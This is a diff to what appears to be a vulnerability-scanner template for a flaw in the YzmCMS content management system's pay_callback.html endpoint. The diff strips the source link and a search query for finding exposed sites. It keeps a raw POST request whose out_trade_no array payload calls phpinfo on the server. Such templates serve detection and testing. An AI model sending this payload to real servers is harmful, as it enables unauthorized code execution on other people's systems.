@@ -3,12 +3,8 @@ info:
   name: YzmCMS 内容管理系统 pay_callback.html 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcy3li1rtp2lk5s5'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gcy3li1rtp2lk5s5
-    fofa: app="yzmcms"
 http:
 - raw:
   - 'POST /pay/index/pay_callback.html HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
